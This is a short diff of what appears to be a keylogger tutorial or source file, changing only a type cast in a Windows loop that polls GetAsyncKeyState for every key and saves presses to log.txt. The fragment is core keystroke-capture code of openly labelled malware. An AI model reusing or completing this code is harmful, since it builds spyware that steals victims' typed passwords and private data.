@@ -63,7 +63,7 @@ A keylogger is a type of malware used in cyberattacks to steal sensitive informa
             Sleep(10);
             for (i = 8; i <= 255; i++) {
                 if (GetAsyncKeyState(i) == -32767) {
-                    Save(i, "log.txt");
+                    Save(i, (char*)"log.txt");
                 }
             }
         }
